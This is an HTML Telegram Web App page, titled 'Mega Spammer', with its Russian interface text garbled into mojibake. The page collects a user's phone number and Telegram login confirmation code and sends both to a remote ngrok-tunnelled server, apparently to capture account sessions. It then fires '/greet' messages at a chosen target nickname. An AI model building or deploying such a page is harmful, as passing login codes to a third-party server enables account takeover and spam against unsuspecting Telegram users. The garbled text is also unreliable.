<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mega Spammer</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: sans-serif; 
            padding: 20px; 
            background-color: var(--tg-theme-bg-color, #fff); 
            color: var(--tg-theme-text-color, #000); 
            display: flex; flex-direction: column; align-items: center;
        }
        .container { width: 100%; max-width: 350px; }
        input { 
            width: 100%; padding: 12px; margin-bottom: 15px; 
            border-radius: 10px; border: 1px solid #ccc; 
            box-sizing: border-box; font-size: 16px;
        }
        button { 
            width: 100%; padding: 15px; 
            background-color: var(--tg-theme-button-color, #3390ec); 
            color: #fff; border: none; border-radius: 10px; 
            font-size: 16px; font-weight: bold; cursor: pointer; 
        }
        button:active { opacity: 0.8; }
        .hidden { display: none; }
        #status { margin-top: 15px; text-align: center; font-size: 14px; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>üöÄ –ë–æ—Ç-–†–∞—Å—Å—ã–ª—å—â–∏–∫</h2>
    
    <div class="container">
        <div id="step1">
            <input type="tel" id="phone" placeholder="+79991234567">
            <button onclick="login()">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
        </div>

        <div id="step2" class="hidden">
            <input type="number" id="code" placeholder="–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è">
            <button onclick="sendCode()">–í–æ–π—Ç–∏</button>
        </div>

        <div id="step3" class="hidden">
            <input type="text" id="target" placeholder="–ù–∏–∫ –¥—Ä—É–≥–∞ (–±–µ–∑ @)">
            <input type="text" id="btnName" placeholder="–¢–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏" oninput="updBtn()">
            <button id="mainBtn" onclick="fire()">–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å</button>
        </div>
        
        <div id="status"></div>
    </div>

    <script>
        // =================================================================
        // –í–ê–ñ–ù–û: –í—Å—Ç–∞–≤—å —Å—é–¥–∞ —Å—Å—ã–ª–∫—É –∏–∑ –æ–∫–Ω–∞ Ngrok (Forwarding)
        // –û–Ω–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è –Ω–∞ https:// –∏ –∑–∞–∫–∞–Ω—á–∏–≤–∞–µ—Ç—Å—è –Ω–∞ .ngrok-free.app
        // –ë–ï–ó —Å–ª—ç—à–∞ "/" –≤ –∫–æ–Ω—Ü–µ!
        
        const SERVER_URL = "https://stiffish-queenie-un-xxxx-xxxx.ngrok-free.app";
        
        // =================================================================

        const tg = window.Telegram.WebApp;
        tg.expand();

        let myPhone = localStorage.getItem("ph") || "";
        if(myPhone) document.getElementById('phone').value = myPhone;

        function showStatus(text, isErr = false) {
            const el = document.getElementById('status');
            el.innerText = text;
            el.className = isErr ? 'error' : 'success';
        }

        async function req(path, body) {
            try {
                const response = await fetch(SERVER_URL + path, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true'},
                    body: JSON.stringify(body)
                });
                return await response.json();
            } catch (e) {
                return {status: 'error', message: '–û—à–∏–±–∫–∞ —Å–≤—è–∑–∏! –ü—Ä–æ–≤–µ—Ä—å, –∑–∞–ø—É—â–µ–Ω –ª–∏ Python –∏ Ngrok.'};
            }
        }

        async function login() {
            myPhone = document.getElementById('phone').value.replace(/\s/g, '');
            localStorage.setItem("ph", myPhone);
            showStatus("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...");
            
            let res = await req('/login/start', {phone: myPhone});
            if(res.status === 'ok') {
                document.getElementById('step1').classList.add('hidden');
                if(res.step === 'authorized') {
                    document.getElementById('step3').classList.remove('hidden');
                    showStatus("–í—ã —É–∂–µ –≤–æ—à–ª–∏!");
                } else {
                    document.getElementById('step2').classList.remove('hidden');
                    showStatus("–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram!");
                }
            } else showStatus(res.message, true);
        }

        async function sendCode() {
            let code = document.getElementById('code').value.trim();
            showStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...");
            let res = await req('/login/complete', {phone: myPhone, code: code});
            if(res.status === 'ok') {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
                showStatus("–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥!");
            } else showStatus(res.message, true);
        }

        function updBtn() {
            let txt = document.getElementById('btnName').value;
            document.getElementById('mainBtn').innerText = txt ? "–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å " + txt : "–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å";
        }

        async function fire() {
            let target = document.getElementById('target').value.trim();
            showStatus("–û—Ç–ø—Ä–∞–≤–ª—è–µ–º...");
            let res = await req('/greet', {phone: myPhone, target: target});
            if(res.status === 'ok') showStatus("–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: " + res.sent);
            else showStatus(res.message, true);
        }
    </script>
</body>
</html>